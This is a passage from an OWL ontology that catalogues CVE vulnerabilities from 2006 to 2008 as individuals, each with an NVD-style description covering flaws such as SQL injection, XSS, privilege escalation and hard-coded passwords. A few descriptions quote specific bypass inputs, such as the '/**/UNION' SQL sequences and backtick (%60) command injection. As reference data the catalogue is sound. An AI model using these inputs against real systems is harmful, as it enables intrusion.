        rdfs:comment "The Security Framework in Apple Mac OS X 10.3.x up to 10.3.9 does not properly prioritize encryption ciphers when negotiating the strongest shared cipher, which causes Secure Transport to user a weaker cipher that makes it easier for remote attackers to decrypt traffic."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-4409

    Annotations: 
        rdfs:comment "The Online Certificate Status Protocol (OCSP) service in the Security Framework in Apple Mac OS X 10.4 through 10.4.8 retrieve certificate revocation lists (CRL) when an HTTP proxy is in use, which could cause the system to accept certificates that have been revoked."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-4410

    Annotations: 
        rdfs:comment "The Security Framework in Apple Mac OS X 10.3.9, and 10.4.x before 10.4.7, does not properly search certificate revocation lists (CRL), which allows remote attackers to access systems by using revoked certificates."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-4447

    Annotations: 
        rdfs:comment "X.Org and XFree86, including libX11, xdm, xf86dga, xinit, xload, xtrans, and xterm, does not check the return values for setuid and seteuid calls when attempting to drop privileges, which might allow local users to gain privileges by causing those calls to fail, such as by exceeding a ulimit."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-4558

    Annotations: 
        rdfs:comment "DeluxeBB 1.06 and earlier, when run on the Apache HTTP Server with the mod_mime module, allows remote attackers to execute arbitrary PHP code by uploading files with double extensions via the fileupload parameter in a newthread action in newpost.php."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-4624

    Types: 
        CVEEntries
    
    
Individual: CVE-2006-4692

    Annotations: 
        rdfs:comment "Argument injection vulnerability in the Windows Object Packager (packager.exe) in Microsoft Windows XP SP1 and SP2 and Server 2003 SP1 and earlier allows remote user-assisted attackers to execute arbitrary commands via a crafted file with a \"/\" (slash) character in the filename of the Command Line property, followed by a valid file extension, which causes the command before the slash to be executed, aka \"Object Packager Dialogue Spoofing Vulnerability.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-5397

    Annotations: 
        rdfs:comment "The Xinput module (modules/im/ximcp/imLcIm.c) in X.Org libX11 1.0.2 and 1.0.3 opens a file for reading twice using the same file descriptor, which causes a file descriptor leak that allows local users to read files specified by the XCOMPOSEFILE environment variable via the duplicate file descriptor."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-5462

    Annotations: 
        rdfs:comment "Mozilla Network Security Service (NSS) library before 3.11.3, as used in Mozilla Firefox before 1.5.0.8, Thunderbird before 1.5.0.8, and SeaMonkey before 1.0.6, when using an RSA key with exponent 3, does not properly handle extra data in a signature, which allows remote attackers to forge signatures for SSL/TLS and email certificates. NOTE: this identifier is for unpatched product versions that were originally intended to be addressed by CVE-2006-4340."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-5525

    Annotations: 
        rdfs:comment "Incomplete blacklist vulnerability in mainfile.php in PHP-Nuke 7.9 and earlier allows remote attackers to conduct SQL injection attacks via (1) \"/**/UNION \" or (2) \" UNION/**/\" sequences, which are not rejected by the protection mechanism, as demonstrated by a SQL injection via the eid parameter in a search action in the Encyclopedia module in modules.php."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-6588

    Annotations: 
        rdfs:comment "The forum implementation in the ecommerce component in the Apache Open For Business Project (OFBiz) trusts the (1) dataResourceTypeId, (2) contentTypeId, and certain other hidden form fields, which allows remote attackers to create unauthorized types of content, modify content, or have other unknown impact."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-6597

    Annotations: 
        rdfs:comment "Argument injection vulnerability in HyperAccess 8.4 allows user-assisted remote attackers to execute arbitrary vbscript and commands via the /r option in a telnet:// URI, which is configured to use hawin32.exe."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-6658

    Annotations: 
        rdfs:comment "Inktomi Search 4.1.4 allows remote attackers to obtain sensitive information via direct requests with missing parameters to (1) help/header.html, (2) thesaurus.html, and (3) topics.html, which leak the installation path in the resulting error message, a related issue to CVE-2006-5970."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-6679

    Annotations: 
        rdfs:comment "Pedro Lineu Orso chetcpasswd before 2.4 relies on the X-Forwarded-For HTTP header when verifying a client's status on an IP address ACL, which allows remote attackers to gain unauthorized access by spoofing this header."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-6870

    Annotations: 
        rdfs:comment "The consume_labels function in avahi-core/dns.c in Avahi before 0.6.16 allows remote attackers to cause a denial of service (infinite loop) via a crafted compressed DNS response with a label that points to itself."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-6994

    Annotations: 
        rdfs:comment "Unrestricted file upload vulnerability in add.asp in OzzyWork Gallery, possibly 2.0 and earlier, allows remote attackers to upload and execute arbitrary ASP files by removing the client-side security checks."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-7142

    Annotations: 
        rdfs:comment "The centralized management feature for Utimaco Safeguard stores hard-coded cryptographic keys in executable programs for encrypted configuration files, which allows attackers to recover the keys from the configuration files and decrypt the disk drive."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2006-7191

    Annotations: 
        rdfs:comment "Untrusted search path vulnerability in lamdaemon.pl in LDAP Account Manager (LAM) before 1.0.0 allows local users to gain privileges via a modified PATH that points to a malicious rm program."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-0100

    Annotations: 
        rdfs:comment "The Perforce client does not restrict the set of files that it overwrites upon receiving a request from the server, which allows remote attackers to overwrite arbitrary files by modifying the client config file on the server, or by operating a malicious server."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-0163

    Annotations: 
        rdfs:comment "SecureKit Steganography 1.7.1 and 1.8 embeds password information in the carrier file, which allows remote attackers to bypass authentication requirements and decrypt embedded steganography by replacing the last 20 bytes of the JPEG image with alternate password information."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-0164

    Annotations: 
        rdfs:comment "Camouflage 1.2.1 embeds password information in the carrier file, which allows remote attackers to bypass authentication requirements and decrypt embedded steganography by replacing certain bytes of the JPEG image with alternate password information."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-0421

    Annotations: 
        rdfs:comment "BEA WebLogic Server 6.1 through 6.1 SP7, and 7.0 through 7.0 SP7 allows remote attackers to cause a denial of service (disk consumption) via requests containing malformed headers, which cause a large amount of data to be written to the server log."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-0681

    Annotations: 
        rdfs:comment "profile.php in ExtCalendar 2 and earlier allows remote attackers to change the passwords of arbitrary users without providing the original password, and possibly perform other unauthorized actions, via modified values to register.php."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-0882

    Annotations: 
        rdfs:comment "Argument injection vulnerability in the telnet daemon (in.telnetd) in Solaris 10 and 11 (SunOS 5.10 and 5.11) misinterprets certain client \"-f\" sequences as valid requests for the login program to skip authentication, which allows remote attackers to log into certain accounts, as demonstrated by the bin account."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-1225

    Annotations: 
        rdfs:comment "The connection log file implementation in Grok Developments NetProxy 4.03 does not record requests that omit http:// in a URL, which might allow remote attackers to conduct unauthorized activities and avoid detection."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-1253

    Annotations: 
        rdfs:comment "Eval injection vulnerability in the (a) kmz_ImportWithMesh.py Script for Blender 0.1.9h, as used in (b) Blender before 2.43, allows user-assisted remote attackers to execute arbitrary Python code by importing a crafted (1) KML or (2) KMZ file."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-1409

    Annotations: 
        rdfs:comment "WordPress allows remote attackers to obtain sensitive information via a direct request for wp-admin/admin-functions.php, which reveals the path in an error message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-1716

    Annotations: 
        rdfs:comment "pam_console does not properly restore ownership for certain console devices when there are multiple users logged into the console and one user logs out, which might allow local users to gain privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-2027

    Annotations: 
        rdfs:comment "Untrusted search path vulnerability in the add_filename_to_string function in intl/gettext/loadmsgcat.c for Elinks 0.11.1 allows local users to cause Elinks to use an untrusted gettext message catalog (.po file) in a \"../po\" directory, which can be leveraged to conduct format string attacks."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-2442

    Annotations: 
        rdfs:comment "The gssrpc__svcauth_gssapi function in the RPC library in MIT Kerberos 5 (krb5) 1.6.1 and earlier might allow remote attackers to execute arbitrary code via a zero-length RPC credential, which causes kadmind to free an uninitialized pointer during cleanup."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-2713

    Annotations: 
        rdfs:comment "ifdate 2.x sends a redirect to the web browser but does not exit when administrative credentials are missing, which allows remote attackers to obtain administrative access via a direct request for the admin/ URI."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-2925

    Annotations: 
        rdfs:comment "The default access control lists (ACL) in ISC BIND 9.4.0, 9.4.1, and 9.5.0a1 through 9.5.0a5 do not set the allow-recursion and allow-query-cache ACLs, which allows remote attackers to make recursive queries and query the cache."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-3012

    Annotations: 
        rdfs:comment "The web interface in Fujitsu-Siemens Computers PRIMERGY BX300 Switch Blade allows remote attackers to obtain sensitive information by canceling the authentication dialog when accessing a sub-page, which still displays the form field contents of the sub-page, as demonstrated using (1) config/ip_management.htm and (2) config/snmp_config.htm."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-3409

    Annotations: 
        rdfs:comment "Net::DNS before 0.60, a Perl module, allows remote attackers to cause a denial of service (stack consumption) via a malformed compressed DNS packet with self-referencing pointers, which triggers an infinite loop."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-3572

    Annotations: 
        rdfs:comment "Incomplete blacklist vulnerability in cgi-bin/runDiagnostics.cgi in the web interface on the Yoggie Pico and Pico Pro allows remote attackers to execute arbitrary commands via shell metacharacters in the param parameter, as demonstrated by URL encoded \"`\" (backtick) characters (%60 sequences)."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-3730

    Annotations: 
        rdfs:comment "The default configuration of the POP server in TCP/IP Services 5.6 for HP OpenVMS 8.3 does not log the source IP address or attempted username for login attempts, which might help remote attackers to avoid identification."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-3798

    Annotations: 
        rdfs:comment "Integer overflow in print-bgp.c in the BGP dissector in tcpdump 3.9.6 and earlier allows remote attackers to execute arbitrary code via crafted TLVs in a BGP packet, related to an unchecked return value."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-3931

    Annotations: 
        rdfs:comment "The wrap_setuid_third_party_application function in the installation script for the Samsung SCX-4200 Driver 2.00.95 adds setuid permissions to third party applications such as xsane and xscanimage, which allows local users to gain privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-4150

    Annotations: 
        rdfs:comment "The Visionsoft Audit on Demand Service (VSAOD) in Visionsoft Audit 12.4.0.0 uses weak cryptography (XOR) when (1) transmitting passwords, which allows remote attackers to obtain sensitive information by sniffing the network; and (2) storing passwords in the configuration file, which allows local users to obtain sensitive information by reading this file."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-4217

    Annotations: 
        rdfs:comment "Stack-based buffer overflow in the domacro function in ftp in IBM AIX 5.2 and 5.3 allows local users to gain privileges via a long parameter to a macro, as demonstrated by executing a macro via the '$' command."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-4238

    Annotations: 
        rdfs:comment "AIX 5.2 and 5.3 install pioinit with user and group ownership of bin, which allows local users with bin or possibly printq privileges to gain root privileges by modifying pioinit."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-4432

    Annotations: 
        rdfs:comment "Untrusted search path vulnerability in the wrapper scripts for the (1) rug, (2) zen-updater, (3) zen-installer, and (4) zen-remover programs on SUSE Linux 10.1 and Enterprise 10 allows local users to gain privileges via modified (a) LD_LIBRARY_PATH and (b) MONO_GAC_PREFIX environment variables."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-4786

    Annotations: 
        rdfs:comment "Cisco Adaptive Security Appliance (ASA) running PIX 7.0 before 7.0.7.1, 7.1 before 7.1.2.61, 7.2 before 7.2.2.34, and 8.0 before 8.0.2.11, when AAA is enabled, composes %ASA-5-111008 messages from the \"test aaa\" command with cleartext passwords and sends them over the network to a remote syslog server or places them in a local logging buffer, which allows context-dependent attackers to obtain sensitive information."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-4961

    Annotations: 
        rdfs:comment "The login_to_simulator method in Linden Lab Second Life, as used by the secondlife:// protocol handler and possibly other Second Life login mechanisms, sends an MD5 hash in cleartext in the passwd field, which allows remote attackers to login to an account by sniffing the network and then sending this hash to a Second Life authentication server."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-5101

    Annotations: 
        rdfs:comment "ChironFS before 1.0 RC7 sets user/group ownership to the mounter account instead of the creator account when files are created, which allows local users to gain privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-5159

    Annotations: 
        rdfs:comment "The ntfs-3g package before 1.913-2.fc7 in Fedora 7, and an ntfs-3g package in Ubuntu 7.10/Gutsy, assign incorrect permissions (setuid root) to mount.ntfs-3g, which allows local users with fuse group membership to read from and write to arbitrary block devices, possibly involving a file descriptor leak."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-5172

    Annotations: 
        rdfs:comment "Quicksilver Forums before 1.4.1 allows remote attackers to obtain sensitive information by causing unspecified connection errors, which reveals the database password in the resulting error message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-5460

    Annotations: 
        rdfs:comment "Microsoft ActiveSync 4.1, as used in Windows Mobile 5.0, uses weak encryption (XOR obfuscation with a fixed key) when sending the user's PIN/Password over the USB connection from the host to the device, which might make it easier for attackers to decode a PIN/Password obtained by (1) sniffing or (2) spoofing the docking process."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-5544

    Annotations: 
        rdfs:comment "IBM Lotus Notes before 6.5.6, and 7.x before 7.0.3; and Domino before 6.5.5 FP3, and 7.x before 7.0.2 FP1; uses weak permissions (Everyone:Full Control) for memory mapped files (shared memory) in IPC, which allows local users to obtain sensitive information, or inject Lotus Script or other character sequences into a session."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-5626

    Annotations: 
        rdfs:comment "make_catalog_backup in Bacula 2.2.5, and probably earlier, sends a MySQL password as a command line argument, and sometimes transmits cleartext e-mail containing this command line, which allows context-dependent attackers to obtain the password by listing the process and its arguments, or by sniffing the network."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-5727

    Annotations: 
        rdfs:comment "Incomplete blacklist vulnerability in the stripScripts function in common.php in OneOrZero Helpdesk 1.6.5.4, 1.6.4.2, and possibly other versions, allows remote attackers to conduct cross-site scripting (XSS) attacks and inject arbitrary web script or HTML via XSS sequences without SCRIPT tags in the description parameter to (1) tcreate.php or (2) tupdate.php, as demonstrated using an onmouseover event in a b tag."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-5778

    Annotations: 
        rdfs:comment "Mobile Spy (1) stores login credentials in cleartext under the RetinaxStudios registry key, and (2) sends login credentials and log data over a cleartext HTTP connection, which allows attackers to obtain sensitive information by reading the registry or sniffing the network."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-5893

    Annotations: 
        rdfs:comment "HTTPSocket.cpp in the C++ Sockets Library before 2.2.5 allows remote attackers to cause a denial of service (crash) via an HTTP request with a missing protocol version number, which triggers an exception. NOTE: some of these details were obtained from third party information."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-6013

    Annotations: 
        rdfs:comment "Wordpress 1.5 through 2.3.1 uses cookie values based on the MD5 hash of a password MD5 hash, which allows attackers to bypass authentication by obtaining the MD5 hash from the user database, then generating the authentication cookie from that hash."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-6033

    Annotations: 
        rdfs:comment "Invensys Wonderware InTouch 8.0 creates a NetDDE share with insecure permissions (Everyone/Full Control), which allows remote authenticated attackers, and possibly anonymous users, to execute arbitrary programs."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-6243

    Annotations: 
        rdfs:comment "Adobe Flash Player 9.x up to 9.0.48.0, 8.x up to 8.0.35.0, and 7.x up to 7.0.70.0 does not sufficiently restrict the interpretation and usage of cross-domain policy files, which makes it easier for remote attackers to conduct cross-domain and cross-site scripting (XSS) attacks."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-6602

    Annotations: 
        rdfs:comment "SQL injection vulnerability in app/models/identity.php in NoseRub 0.5.2 and earlier allows remote attackers to execute arbitrary SQL commands via the username field to the login script."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2007-6652

    Annotations: 
        rdfs:comment "cpie.php in XCMS 1.83 and earlier sends a redirect to the web browser but does not exit, which allows remote attackers to conduct direct static code injection attacks and execute arbitrary code via the testo_0 parameter in a cpie admin action to index.php, which writes to dati/generali/footer.dtb (aka the XCMS footer)."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-0087

    Annotations: 
        rdfs:comment "The DNS client in Microsoft Windows 2000 SP4, XP SP2, Server 2003 SP1 and SP2, and Vista uses predictable DNS transaction IDs, which allows remote attackers to spoof DNS responses."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-0141

    Annotations: 
        rdfs:comment "actions.php in WebPortal CMS 0.6-beta generates predictable passwords containing only the time of day, which makes it easier for remote attackers to obtain access to any account via a lostpass action."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-0162

    Annotations: 
        rdfs:comment "misc.c in splitvt 1.6.6 and earlier does not drop group privileges before executing xprop, which allows local users to gain privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-0166

    Annotations: 
        rdfs:comment "OpenSSL 0.9.8c-1 up to versions before 0.9.8g-9 on Debian-based operating systems uses a random number generator that generates predictable numbers, which makes it easier for remote attackers to conduct brute force guessing attacks against cryptographic keys."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-0174

    Annotations: 
        rdfs:comment "GE Fanuc Proficy Real-Time Information Portal 2.6 and earlier uses HTTP Basic Authentication, which transmits usernames and passwords in base64-encoded cleartext and allows remote attackers to steal the passwords and gain privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-0306

    Annotations: 
        rdfs:comment "sdbstarter in SAP MaxDB 7.6.0.37, and possibly other versions, allows local users to execute arbitrary commands by using unspecified environment variables to modify configuration settings."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-0322

    Annotations: 
        rdfs:comment "The I2O Utility Filter driver (i2omgmt.sys) 5.1.2600.2180 for Microsoft Windows XP sets Everyone/Write permissions for the \"\\\\.\\I2OExc\" device interface, which allows local users to gain privileges. NOTE: this issue can be leveraged to overwrite arbitrary memory and execute code via an IOCTL call with a crafted DeviceObject pointer."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-0368

    Annotations: 
        rdfs:comment "onedcu in IBM Informix Dynamic Server (IDS) 10.x before 10.00.xC8 allows local users to create arbitrary files via the Trace file argument."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-0374

    Annotations: 
        rdfs:comment "OKI C5510MFP Printer CU H2.15, PU 01.03.01, System F/W 1.01, and Web Page 1.00 sends the configuration of the printer in cleartext, which allows remote attackers to obtain the administrative password by connecting to TCP port 5548 or 7777."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-0600

    Annotations: 
        rdfs:comment "The vmsplice_to_pipe function in Linux kernel 2.6.17 through 2.6.24.1 does not validate a certain userspace pointer before dereference, which allows local users to gain root privileges via crafted arguments in a vmsplice system call, a different vulnerability than CVE-2008-0009 and CVE-2008-0010."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-0662

    Annotations: 
        rdfs:comment "The Auto Local Logon feature in Check Point VPN-1 SecuRemote/SecureClient NGX R60 and R56 for Windows caches credentials under the Checkpoint\\SecuRemote registry key, which has Everyone/Full Control permissions, which allows local users to gain privileges by reading and reusing the credentials."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-0961

    Annotations: 
        rdfs:comment "EMV DiskXtender 6.20.060 has a hard-coded login and password, which allows remote attackers to bypass authentication via the RPC interface."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-0971

    Annotations: 
        rdfs:comment "Multiple cross-site scripting (XSS) vulnerabilities in index.cgi in Barracuda Spam Firewall (BSF) before 3.5.12.007, Message Archiver before 1.2.1.002, Web Filter before 3.3.0.052, IM Firewall before 3.1.01.017, and Load Balancer before 2.3.024 allow remote attackers to inject arbitrary web script or HTML via (1) the Policy Name field in Search Based Retention Policy in Message Archiver; unspecified parameters in the (2) IP Configuration, (3) Administration, (4) Journal Accounts, (5) Retention Policy, and (6) GroupWise Sync components in Message Archiver; (7) input to search operations in Web Filter; and (8) input used in error messages and (9) hidden INPUT elements in (a) Spam Firewall, (b) IM Firewall, and (c) Web Filter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-1160

    Annotations: 
        rdfs:comment "ZyXEL ZyWALL 1050 has a hard-coded password for the Quagga and Zebra processes that is not changed when it is set by a user, which allows remote attackers to gain privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-1203

    Annotations: 
        rdfs:comment "The administrator interface for Adobe ColdFusion 8 and ColdFusion MX7 does not log failed authentication attempts, which makes it easier for remote attackers to conduct brute force attacks without detection."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-1284

    Annotations: 
        rdfs:comment "Directory traversal vulnerability in Horde 3.1.6, Groupware before 1.0.5, and Groupware Webmail Edition before 1.0.6, when running with certain configurations, allows remote authenticated users to read and execute arbitrary files via \"..\" sequences and a null byte in the theme name."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-1303

    Annotations: 
        rdfs:comment "The Perforce service (p4s.exe) in Perforce Server 2007.3/143793 and earlier allows remote attackers to cause a denial of service (daemon crash) via a missing parameter to the (1) dm-FaultFile, (2) dm-LazyCheck, (3) dm-ResolvedFile, (4) dm-OpenFile, (5) crypto, and possibly unspecified other commands, which triggers a NULL pointer dereference."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-1319

    Annotations: 
        rdfs:comment "Untrusted search path and argument injection vulnerability in the VersantD service in Versant Object Database 7.0.1.3 and earlier, as used in Borland CaliberRM and probably other products, allows remote attackers to execute arbitrary commands via a request to TCP port 5019 with a modified VERSANT_ROOT field."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-1440

    Annotations: 
        rdfs:comment "Microsoft Windows XP SP2 and SP3, and Server 2003 SP1 and SP2, does not properly validate the option length field in Pragmatic General Multicast (PGM) packets, which allows remote attackers to cause a denial of service (infinite loop and system hang) via a crafted PGM packet, aka the \"PGM Invalid Length Vulnerability.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-1526

    Annotations: 
        rdfs:comment "ZyXEL Prestige routers, including P-660, P-661, and P-662 models with firmware 3.40(PE9) and 3.40(AGD.2) through 3.40(AHQ.3), do not use a salt when calculating an MD5 password hash, which makes it easier for attackers to crack passwords."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-1567

    Annotations: 
        rdfs:comment "phpMyAdmin before 2.11.5.1 stores the MySQL (1) username and (2) password, and the (3) Blowfish secret key, in cleartext in a Session file under /tmp, which allows local users to obtain sensitive information."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-1579

    Annotations: 
        rdfs:comment "Wiki Server in Apple Mac OS X 10.5 before 10.5.3 allows remote attackers to obtain sensitive information (user names) by reading the error message produced upon access to a nonexistent blog."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-1625

    Annotations: 
        rdfs:comment "aavmker4.sys in avast! Home and Professional 4.7 for Windows does not properly validate input to IOCTL 0xb2d60030, which allows local users to gain privileges via certain IOCTL requests."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-1700

    Annotations: 
        rdfs:comment "The Web TransferCtrl Class 8,2,1,4 (iManFile.cab), as used in WorkSite Web 8.2 before SP1 P2, allows remote attackers to cause a denial of service (memory consumption) via a large number of SendNrlLink directives, which opens a separate window for each directive."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-1737

    Annotations: 
        rdfs:comment "Sophos Anti-Virus 7.0.5, and other 7.x versions, when Runtime Behavioural Analysis is enabled, allows local users to cause a denial of service (reboot with the product disabled) and possibly gain privileges via a zero value in a certain length field in the ObjectAttributes argument to the NtCreateKey hooked System Service Descriptor Table (SSDT) function."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-1738

    Annotations: 
        rdfs:comment "Rising Antivirus 2008 before 20.38.20 allows local users to cause a denial of service (system crash) via an invalid pointer to the _CLIENT_ID structure in a call to the NtOpenProcess hooked System Service Descriptor Table (SSDT) function."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-1810

    Annotations: 
        rdfs:comment "Untrusted search path vulnerability in dbmsrv in SAP MaxDB 7.6.03.15 on Linux allows local users to gain privileges via a modified PATH environment variable."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-1877

    Annotations: 
        rdfs:comment "tss 0.8.1 allows local users to read arbitrary files via the -a parameter, which is processed while tss is running with privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-2020

    Annotations: 
        rdfs:comment "The CAPTCHA implementation as used in (1) Francisco Burzi PHP-Nuke 7.0 and 8.1, (2) my123tkShop e-Commerce-Suite (aka 123tkShop) 0.9.1, (3) phpMyBitTorrent 1.2.2, (4) TorrentFlux 2.3, (5) e107 0.7.11, (6) WebZE 0.5.9, (7) Open Media Collectors Database (aka OpenDb) 1.5.0b4, and (8) Labgab 1.1 uses a code_bg.jpg background image and the PHP ImageString function in a way that produces an insufficient number of different images, which allows remote attackers to pass the CAPTCHA test via an automated attack using a table of all possible image checksums and their corresponding digit strings."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-2049

    Annotations: 
        rdfs:comment "The POP3 server (EPSTPOP3S.EXE) 4.22 in E-Post Mail Server 4.10 allows remote attackers to obtain sensitive information via multiple crafted APOP commands for a known POP3 account, which displays the password in a POP3 error message."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-2052

    Annotations: 
        rdfs:comment "Open redirect vulnerability in redirect.php in Bitrix Site Manager 6.5 allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL in the goto parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-2108

    Annotations: 
        rdfs:comment "The GENERATE_SEED macro in PHP 4.x before 4.4.8 and 5.x before 5.2.5, when running on 64-bit systems, performs a multiplication that generates a portion of zero bits during conversion due to insufficient precision, which produces 24 bits of entropy and simplifies brute force attacks against protection mechanisms that use the rand and mt_rand functions."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-2223

    Annotations: 
        rdfs:comment "SQL injection vulnerability in group_posts.php in vShare YouTube Clone 2.6 allows remote attackers to execute arbitrary SQL commands via the tid parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-2252

    Annotations: 
        rdfs:comment "The kernel in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, and Server 2008 does not properly validate parameters sent from user mode to the kernel, which allows local users to gain privileges via a crafted application, aka \"Windows Kernel Memory Corruption Vulnerability.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-2309

    Annotations: 
        rdfs:comment "Incomplete blacklist vulnerability in CoreTypes in Apple Mac OS X before 10.5.4 allows user-assisted remote attackers to execute arbitrary code via a (1) .xht or (2) .xhtm file, which does not trigger a \"potentially unsafe\" warning message in (a) the Download Validation feature in Mac OS X 10.4 or (b) the Quarantine feature in Mac OS X 10.5."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-2369

    Annotations: 
        rdfs:comment "manzier.pxt in Red Hat Network Satellite Server before 5.1.1 has a hard-coded authentication key, which allows remote attackers to connect to the server and obtain sensitive information about user accounts and entitlements."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-2374

    Annotations: 
        rdfs:comment "src/sdp.c in bluez-libs 3.30 in BlueZ, and other bluez-libs before 3.34 and bluez-utils before 3.34 versions, does not validate string length fields in SDP packets, which allows remote SDP servers to cause a denial of service or possibly have unspecified other impact via a crafted length field that triggers excessive memory allocation or a buffer over-read."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2008-2380

    Annotations: 
